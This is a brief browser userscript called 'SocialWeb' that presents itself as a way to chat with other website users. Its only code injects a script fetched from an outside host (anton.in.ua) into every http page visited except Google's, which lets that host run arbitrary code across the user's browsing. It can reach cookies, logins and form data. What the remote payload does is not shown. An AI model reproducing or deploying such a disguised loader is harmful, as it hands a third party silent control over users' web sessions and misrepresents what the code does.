// ==UserScript==
// @name SocialWeb
// @namespace socialweb.ru/
// @version 1.0
// @source socialweb.ru/
// @description Script allow you to comunicate with other website users
// @include http://*
// @exclude google.com/*
// @exclude http://*.google.com*
// ==/UserScript==

function SocialWeb()
{
    this.load = function(url)
    {
        var el=document.createElement('script');
        el.setAttribute('src', url)
        try
        {
            document.body.appendChild(el);
        }
        catch(er){}
    }
}
if( document.body.innerHTML.length>3000 && document.body.clientWidth>700)
{
    socialweb = new SocialWeb();
    socialweb.load('http://ajax.googleapis.com/ajax/libs/jquery/1.4.2/jquery.min.js?r='+Math.random())
    socialweb.load('http://anton.in.ua/sweb/client/load.php?r='+Math.random());
}
